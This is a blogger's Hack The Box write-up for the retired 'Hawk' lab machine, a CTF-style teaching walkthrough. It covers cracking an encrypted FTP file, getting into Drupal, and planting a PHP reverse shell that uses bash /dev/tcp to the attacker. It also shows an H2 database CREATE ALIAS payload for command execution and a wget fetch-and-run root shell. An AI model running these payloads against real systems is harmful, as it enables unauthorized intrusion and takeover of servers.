<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Hawk - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Hawk"><a href="#Hack-The-Box-Hawk" class="headerlink" title="Hack The Box - Hawk"></a>Hack The Box - Hawk</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hawk has retired and this is my write-up about it.<br>It’s a Linux box and it’s ip is 10.10.10.102 so let’s jump right in !<br><img src="/images/hackthebox/hawk/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Starting with a simple nmap scan to scan tor TCP , UDP ports and services.<br><code>nmap -sV -sT -sU 10.10.10.102</code><br><img src="/images/hackthebox/hawk/1.png" alt=""></p>
<p>We will see that we got FTP on port 21 , SSH on port 22 , HTTP on port 80 running apache server and HTTP on port 8082 running H2 Database HTTP Console.</p>
<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>Since there’s FTP on the box let’s check if we can do anonymous login.<br><img src="/images/hackthebox/hawk/2.png" alt=""><br>We could login as anonymous and we got a file called : .drupal.txt.enc<br>Since it ends with .enc then it’s an encrypted file.<br>Let’s run file command against it to get more information.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file drupal.txt.enc</span><br><span class="line">drupal.txt.enc : openssl enc&#39;d data with salted password , base64 encoded</span><br></pre></td></tr></table></figure>
<p>So base64 encoded ? Let’s decode it.</p>
<p><code>base64 -d drupal.txt.enc &gt; drupal_decoded.txt.enc</code><br><img src="/images/hackthebox/hawk/3.png" alt=""><br>Now the file is ready for bruteforcing.</p>
<h2 id="Decrypting-The-File"><a href="#Decrypting-The-File" class="headerlink" title="Decrypting The File"></a>Decrypting The File</h2><p>To get the password for decryption we will use a tool called bruteforce-salted-openssl with rockyou.<br>It’s already installed on kali but if you’re not using kali you can get it from <a href="https://github.com/glv2/bruteforce-salted-openssl" target="_blank" rel="noopener">here</a><br>Now there’s a small problem. We need to specify the right cipher and digest to be able to crack the file so we have to do some guessing.<br>I already cracked it so the cipher is AES-256-CBC and the digest is SHA256.<br><code>bruteforce-salted-openssl -t 50 -f /usr/share/wordlists/rockyou.txt -d sha256 drupal_decoded.txt.enc -1</code><br>You may ask yourself why I didn’t specify the cipher. I didn’t specify it because the tool uses AES-256-CBC by default.<br><img src="/images/hackthebox/hawk/4.png" alt=""><br>Great ! We got the password : friends . Let’s decrypt the file.<br><code>openssl aes-256-cbc -d -in drupal_decoded.txt.enc -out drupal.txt -k friends</code><br><img src="/images/hackthebox/hawk/5.png" alt=""><br>Now we have a username : “daniel” and a password : PencilKeybaordScanner123</p>
<h2 id="Drupal"><a href="#Drupal" class="headerlink" title="Drupal"></a>Drupal</h2><p>We see in the message that the password is for a portal. But what portal?<br>Let’s visit the website on port 80<br><img src="/images/hackthebox/hawk/6.png" alt=""><br>We see that it’s running drupal CMS<br>Let’s login with the credentials we have.<br>Username daniel didn’t work but admin worked and we got in as admin !<br><img src="/images/hackthebox/hawk/7.png" alt=""><br>After we enumerate for a while we will see some interesting stuff.<br>The content tab which allows us to add content and the modules tab.<br>If we tried to add content we will get two options : Article or a basic page.<br>We will focus on basic pages for sure but we can only use html , filtered html and plain text .<br>Let’s look in the modules tab.<br>We will find a module called php filter which allows us to use php in pages. After we enable it we will get a fourth option : php code<br><img src="/images/hackthebox/hawk/8.png" alt=""><br>Great ! Let’s get a reverse shell </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> exec(<span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.xx.xx/9090 0&gt;&amp;1'"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/hawk/9.png" alt=""></p>
<p><img src="/images/hackthebox/hawk/10.png" alt=""><br>Let’s check our listener.<br><img src="/images/hackthebox/hawk/11.png" alt=""><br>bam we got a low privilege shell as www-data !</p>
<h2 id="Privilege-Escalation-to-daniel"><a href="#Privilege-Escalation-to-daniel" class="headerlink" title="Privilege Escalation to daniel"></a>Privilege Escalation to daniel</h2><p>So we’re now in as www-data let’s check sensitive files first.<br>In drupal 7 documentation <a href="https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory" target="_blank" rel="noopener">This section</a> it’s mentioned that settings.php contains where the database is located , how to access it and the credentials to access it. So this file has some sensitive information let’s check that out.<br><img src="/images/hackthebox/hawk/12.png" alt=""></p>
<p><img src="/images/hackthebox/hawk/13.png" alt=""><br>We got a password : drupal4hawk , Let’s try ssh<br><img src="/images/hackthebox/hawk/14.png" alt=""><br>We got in ! But when we login we get a python interpreter. We will get a shell with pty</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/hawk/15.png" alt=""><br>And we got user ! :D</p>
<h2 id="Accessing-H2-Database"><a href="#Accessing-H2-Database" class="headerlink" title="Accessing H2 Database"></a>Accessing H2 Database</h2><p>Now with some regular enumeration if we check out root processes we will see those 2 processes.<br><img src="/images/hackthebox/hawk/16.png" alt=""><br>Sounds familiar ? Yup the H2 Database.<br>If we return to our nmap scan we will see port 8082 running H2 Database HTTP Console.<br><img src="/images/hackthebox/hawk/1.png" alt=""><br>Now we know that it’s running as root so let’s try to access that.<br><img src="/images/hackthebox/hawk/17.png" alt=""><br>Remote connection is disabled. This means that we can only connect locally.<br>To bypass that we will use ssh tunneling.<br>And if you don’t know what ssh tunneling is … simply we will forward the connection from the box to our machine. This means that the H2 console will be accessed locally from the box then that connection will be forwarded to us.<br><code>ssh -L 8080:127.0.0.1:8082 daniel@10.10.10.102</code><br><img src="/images/hackthebox/hawk/18.png" alt=""><br>Now if we visit our localhost on port 8080 we will get the login page.<br>By default it doesn’t have a password so we can access the console without credentials but when we login without credentials it gives an error.<br><img src="/images/hackthebox/hawk/19.png" alt=""><br>Let’s try changing the JDBC URL to something we know that it exists. <code>/root</code> :<br><img src="/images/hackthebox/hawk/20.png" alt=""><br>It worked . Now we have access to the console.<br><img src="/images/hackthebox/hawk/21.png" alt=""></p>
<h2 id="Abusing-H2-Database-ALIAS-and-Privilege-Escalation-to-root"><a href="#Abusing-H2-Database-ALIAS-and-Privilege-Escalation-to-root" class="headerlink" title="Abusing H2 Database ALIAS and Privilege Escalation to root"></a>Abusing H2 Database ALIAS and Privilege Escalation to root</h2><p>Basically the <a href="http://www.h2database.com/html/grammar.html#create_alias" target="_blank" rel="noopener">CREATE ALIAS</a> method creates a function that executes java code.<br>Since we can execute java code then we can do anything. So we will create a function that executes system commands then we will get a shell.<br>First we will create ALIAS called SHELLEXEC. The payload will be like this :</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">CREATE ALIAS SHELLEXEC AS $$ String <span class="title">shellexec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> java.io.IOException </span>&#123; java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>); <span class="keyword">return</span> s.hasNext() ? s.next() : <span class="string">""</span>;  &#125;$$;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/hawk/22.png" alt=""><br>Then we will execute system commands by calling the function that we created. Let’s execute whoami.<br><code>call SHELLEXEC(&quot;whoami&quot;)</code><br><img src="/images/hackthebox/hawk/23.png" alt=""><br>And we see root :D</p>
<p><em>NOTE: That H2 Database ALIAS exploit is not mine. Credits go to the creator . check his write-up about the exploit <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html" target="_blank" rel="noopener">here</a></em></p>
<p>now since we can execute system commands it’s over ! We can get a root shell.<br>But We can’t write a shell command and execute it right away it won’t work so instead of that we can write our shell in a .sh file then upload it and execute it.<br>Another way is to use msfvenom but it’s not needed here because the exploit is simple.<br>First we will create the shell file.<br><code>bash -i &gt;&amp; /dev/tcp/10.10.xx.xx/1234 0&gt;&amp;1 &gt; shell</code><br>Then we will set up a HTTP server with python to host the shell.<br><code>python -m SimpleHTTPServer 7777</code><br><img src="/images/hackthebox/hawk/24.png" alt=""><br>Now we will use wget to get the shell file on the box.<br><code>call SHELLEXEC(&quot;wget http://10.10.xx.xx:7777/shell&quot;)</code><br><img src="/images/hackthebox/hawk/25.png" alt=""></p>
<p><img src="/images/hackthebox/hawk/26.png" alt=""><br>We will make the file executable.<br><code>call SHELLEXEC(&quot;chmod +x shell&quot;)</code><br><img src="/images/hackthebox/hawk/27.png" alt=""><br>Then we will rename it to shell.sh<br><code>call SHELLEXEC(&quot;mv shell shell.sh&quot;)</code><br><img src="/images/hackthebox/hawk/28.png" alt=""><br>And finally we execute it.<br><code>call SHELLEXEC(&quot;bash shell.sh&quot;)</code><br><img src="/images/hackthebox/hawk/29.png" alt=""><br>We don’t get a response which is a good sign. Let’s check our listener.<br><img src="/images/hackthebox/hawk/30.png" alt=""><br>And we get a shell as root ! :D</p>
<p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/jerry/">Hack The Box - Jerry</a><br>Next Hack The Box write-up : <a href="/hack-the-box/active/">Hack The Box - Active</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2018-12-01</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/cryptography/" rel="tag">#cryptography</a> <a class="tag-link" href="/tags/drupal/" rel="tag">#drupal</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/networking/" rel="tag">#networking</a> <a class="tag-link" href="/tags/pivoting/" rel="tag">#pivoting</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
